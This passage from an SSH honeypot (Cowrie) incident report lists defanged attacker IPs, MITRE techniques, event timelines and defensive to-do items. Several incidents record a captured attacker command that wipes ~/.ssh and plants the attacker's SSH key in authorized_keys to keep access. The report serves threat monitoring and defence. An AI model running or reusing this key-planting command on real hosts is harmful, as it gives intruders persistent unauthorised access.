| `2026-09-01 19:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b41696e1f72

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:11` | `cowrie.session.connect` |
| `2026-09-01 19:49:11` | `cowrie.client.version` |
| `2026-09-01 19:49:11` | `cowrie.client.kex` |
| `2026-09-01 19:49:12` | `cowrie.login.success` |
| `2026-09-01 19:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b046b0e5c37

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:13` | `cowrie.session.connect` |
| `2026-09-01 19:49:13` | `cowrie.client.version` |
| `2026-09-01 19:49:13` | `cowrie.client.kex` |
| `2026-09-01 19:49:14` | `cowrie.login.success` |
| `2026-09-01 19:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578d695d7cd0

| Field | Detail |
|---|---|
| **Source IP** | `101.96.200[.]56` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:26` | `cowrie.session.connect` |
| `2026-09-01 19:49:26` | `cowrie.client.version` |
| `2026-09-01 19:49:26` | `cowrie.client.kex` |
| `2026-09-01 19:49:27` | `cowrie.login.success` |
| `2026-09-01 19:49:28` | `cowrie.session.params` |
| `2026-09-01 19:49:28` | `cowrie.command.input` |
| `2026-09-01 19:49:28` | `cowrie.command.failed` |
| `2026-09-01 19:49:29` | `cowrie.log.closed` |
| `2026-09-01 19:49:30` | `cowrie.session.params` |
| `2026-09-01 19:49:30` | `cowrie.command.input` |
| `2026-09-01 19:49:30` | `cowrie.session.file_download` |
| `2026-09-01 19:49:30` | `cowrie.log.closed` |
| `2026-09-01 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.200[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.96.200[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17b54e3964b9

| Field | Detail |
|---|---|
| **Source IP** | `101.96.200[.]56` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:30` | `cowrie.session.connect` |
| `2026-09-01 19:49:30` | `cowrie.client.version` |
| `2026-09-01 19:49:31` | `cowrie.client.kex` |
| `2026-09-01 19:49:32` | `cowrie.login.success` |
| `2026-09-01 19:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.200[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.96.200[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4b7516f4fb0

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]153` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:31` | `cowrie.session.connect` |
| `2026-09-01 19:49:31` | `cowrie.client.version` |
| `2026-09-01 19:49:31` | `cowrie.client.kex` |
| `2026-09-01 19:49:32` | `cowrie.login.success` |
| `2026-09-01 19:49:32` | `cowrie.session.params` |
| `2026-09-01 19:49:32` | `cowrie.command.input` |
| `2026-09-01 19:49:32` | `cowrie.command.failed` |
| `2026-09-01 19:49:32` | `cowrie.log.closed` |
| `2026-09-01 19:49:33` | `cowrie.session.params` |
| `2026-09-01 19:49:33` | `cowrie.command.input` |
| `2026-09-01 19:49:33` | `cowrie.session.file_download` |
| `2026-09-01 19:49:33` | `cowrie.log.closed` |
| `2026-09-01 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]153` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ce17f68b6e

| Field | Detail |
|---|---|
| **Source IP** | `101.96.200[.]56` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:32` | `cowrie.session.connect` |
| `2026-09-01 19:49:32` | `cowrie.client.version` |
| `2026-09-01 19:49:32` | `cowrie.client.kex` |
| `2026-09-01 19:49:34` | `cowrie.login.success` |
| `2026-09-01 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.200[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.96.200[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3864bde4a5ae

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]153` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:33` | `cowrie.session.connect` |
| `2026-09-01 19:49:33` | `cowrie.client.version` |
| `2026-09-01 19:49:33` | `cowrie.client.kex` |
| `2026-09-01 19:49:34` | `cowrie.login.success` |
| `2026-09-01 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]153` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4831a33f9eaa

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]153` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:34` | `cowrie.session.connect` |
| `2026-09-01 19:49:34` | `cowrie.client.version` |
| `2026-09-01 19:49:34` | `cowrie.client.kex` |
| `2026-09-01 19:49:34` | `cowrie.login.success` |
| `2026-09-01 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]153` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379b1a8b17d9

| Field | Detail |
|---|---|
| **Source IP** | `151.225.212[.]1` |
| **First Seen** | 2026-09-01 19:50 |
| **Last Seen** | 2026-09-01 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:50:39` | `cowrie.session.connect` |
| `2026-09-01 19:50:39` | `cowrie.client.version` |
| `2026-09-01 19:50:39` | `cowrie.client.kex` |
| `2026-09-01 19:50:40` | `cowrie.login.success` |
| `2026-09-01 19:50:41` | `cowrie.session.params` |
| `2026-09-01 19:50:41` | `cowrie.command.input` |
| `2026-09-01 19:50:41` | `cowrie.command.failed` |
| `2026-09-01 19:50:41` | `cowrie.log.closed` |
| `2026-09-01 19:50:41` | `cowrie.session.params` |
| `2026-09-01 19:50:41` | `cowrie.command.input` |
| `2026-09-01 19:50:42` | `cowrie.session.file_download` |
| `2026-09-01 19:50:42` | `cowrie.log.closed` |
| `2026-09-01 19:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.225.212[.]1` to AbuseIPDB if not already reported
- [ ] Block `151.225.212[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9f078cfb2a

| Field | Detail |
|---|---|
| **Source IP** | `151.225.212[.]1` |
| **First Seen** | 2026-09-01 19:50 |
| **Last Seen** | 2026-09-01 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:50:42` | `cowrie.session.connect` |
| `2026-09-01 19:50:42` | `cowrie.client.version` |
| `2026-09-01 19:50:42` | `cowrie.client.kex` |
| `2026-09-01 19:50:42` | `cowrie.login.success` |
| `2026-09-01 19:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.225.212[.]1` to AbuseIPDB if not already reported
- [ ] Block `151.225.212[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e69aadf54be

| Field | Detail |
|---|---|
| **Source IP** | `151.225.212[.]1` |
| **First Seen** | 2026-09-01 19:50 |
| **Last Seen** | 2026-09-01 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:50:42` | `cowrie.session.connect` |
| `2026-09-01 19:50:42` | `cowrie.client.version` |
| `2026-09-01 19:50:42` | `cowrie.client.kex` |
| `2026-09-01 19:50:43` | `cowrie.login.success` |
| `2026-09-01 19:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.225.212[.]1` to AbuseIPDB if not already reported
- [ ] Block `151.225.212[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-923845524990

| Field | Detail |
|---|---|
| **Source IP** | `79.3.96[.]178` |
| **First Seen** | 2026-09-01 19:52 |
| **Last Seen** | 2026-09-01 19:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:52:06` | `cowrie.session.connect` |
| `2026-09-01 19:52:06` | `cowrie.client.version` |
| `2026-09-01 19:52:07` | `cowrie.client.kex` |
| `2026-09-01 19:52:07` | `cowrie.login.success` |
| `2026-09-01 19:52:08` | `cowrie.session.params` |
| `2026-09-01 19:52:08` | `cowrie.command.input` |
| `2026-09-01 19:52:08` | `cowrie.command.failed` |
| `2026-09-01 19:52:08` | `cowrie.log.closed` |
| `2026-09-01 19:52:09` | `cowrie.session.params` |
| `2026-09-01 19:52:09` | `cowrie.command.input` |
| `2026-09-01 19:52:09` | `cowrie.session.file_download` |
| `2026-09-01 19:52:09` | `cowrie.log.closed` |
| `2026-09-01 19:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.3.96[.]178` to AbuseIPDB if not already reported
- [ ] Block `79.3.96[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d6517fe167

| Field | Detail |
|---|---|
| **Source IP** | `79.3.96[.]178` |
| **First Seen** | 2026-09-01 19:52 |
| **Last Seen** | 2026-09-01 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:52:09` | `cowrie.session.connect` |
| `2026-09-01 19:52:09` | `cowrie.client.version` |
| `2026-09-01 19:52:09` | `cowrie.client.kex` |
| `2026-09-01 19:52:10` | `cowrie.login.success` |
| `2026-09-01 19:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.3.96[.]178` to AbuseIPDB if not already reported
- [ ] Block `79.3.96[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f791ab1f5d

| Field | Detail |
|---|---|
| **Source IP** | `79.3.96[.]178` |
| **First Seen** | 2026-09-01 19:52 |
| **Last Seen** | 2026-09-01 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:52:10` | `cowrie.session.connect` |
| `2026-09-01 19:52:10` | `cowrie.client.version` |
| `2026-09-01 19:52:10` | `cowrie.client.kex` |
| `2026-09-01 19:52:11` | `cowrie.login.success` |
| `2026-09-01 19:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.3.96[.]178` to AbuseIPDB if not already reported
- [ ] Block `79.3.96[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6090d724d948

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:52 |
| **Last Seen** | 2026-09-01 19:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:52:58` | `cowrie.session.connect` |
| `2026-09-01 19:52:58` | `cowrie.client.version` |
| `2026-09-01 19:52:58` | `cowrie.client.kex` |
| `2026-09-01 19:52:59` | `cowrie.login.success` |
| `2026-09-01 19:52:59` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:52:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:52:59` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804ce960a50d

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-01 19:53 |
| **Last Seen** | 2026-09-01 19:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:53:18` | `cowrie.session.connect` |
| `2026-09-01 19:53:18` | `cowrie.client.version` |
| `2026-09-01 19:53:18` | `cowrie.client.kex` |
| `2026-09-01 19:53:19` | `cowrie.login.success` |
| `2026-09-01 19:53:20` | `cowrie.session.params` |
| `2026-09-01 19:53:20` | `cowrie.command.input` |
| `2026-09-01 19:53:20` | `cowrie.command.failed` |
| `2026-09-01 19:53:21` | `cowrie.log.closed` |
| `2026-09-01 19:53:22` | `cowrie.session.params` |
| `2026-09-01 19:53:22` | `cowrie.command.input` |
| `2026-09-01 19:53:22` | `cowrie.session.file_download` |
| `2026-09-01 19:53:22` | `cowrie.log.closed` |
| `2026-09-01 19:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de88e2d7e9dd

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-01 19:53 |
| **Last Seen** | 2026-09-01 19:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:53:22` | `cowrie.session.connect` |
| `2026-09-01 19:53:22` | `cowrie.client.version` |
| `2026-09-01 19:53:23` | `cowrie.client.kex` |
| `2026-09-01 19:53:24` | `cowrie.login.success` |
| `2026-09-01 19:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7555f9c9da8

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-01 19:53 |
| **Last Seen** | 2026-09-01 19:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:53:24` | `cowrie.session.connect` |
| `2026-09-01 19:53:24` | `cowrie.client.version` |
| `2026-09-01 19:53:24` | `cowrie.client.kex` |
| `2026-09-01 19:53:25` | `cowrie.login.success` |
| `2026-09-01 19:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-365481daa256

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-09-01 19:54 |
| **Last Seen** | 2026-09-01 19:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:54:21` | `cowrie.session.connect` |
| `2026-09-01 19:54:21` | `cowrie.client.version` |
| `2026-09-01 19:54:21` | `cowrie.client.kex` |
| `2026-09-01 19:54:22` | `cowrie.login.success` |
| `2026-09-01 19:54:23` | `cowrie.session.params` |
| `2026-09-01 19:54:23` | `cowrie.command.input` |
| `2026-09-01 19:54:23` | `cowrie.command.failed` |
| `2026-09-01 19:54:23` | `cowrie.log.closed` |
| `2026-09-01 19:54:24` | `cowrie.session.params` |
| `2026-09-01 19:54:24` | `cowrie.command.input` |
| `2026-09-01 19:54:24` | `cowrie.session.file_download` |
| `2026-09-01 19:54:24` | `cowrie.log.closed` |
| `2026-09-01 19:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a16a1eeb9f5

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-09-01 19:54 |
| **Last Seen** | 2026-09-01 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:54:25` | `cowrie.session.connect` |
| `2026-09-01 19:54:25` | `cowrie.client.version` |
| `2026-09-01 19:54:25` | `cowrie.client.kex` |
| `2026-09-01 19:54:26` | `cowrie.login.success` |
| `2026-09-01 19:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab075e36ed22

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-09-01 19:54 |
| **Last Seen** | 2026-09-01 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:54:26` | `cowrie.session.connect` |
| `2026-09-01 19:54:26` | `cowrie.client.version` |
| `2026-09-01 19:54:26` | `cowrie.client.kex` |
| `2026-09-01 19:54:27` | `cowrie.login.success` |
| `2026-09-01 19:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f44422f03867

| Field | Detail |
|---|---|
| **Source IP** | `193.163.187[.]76` |
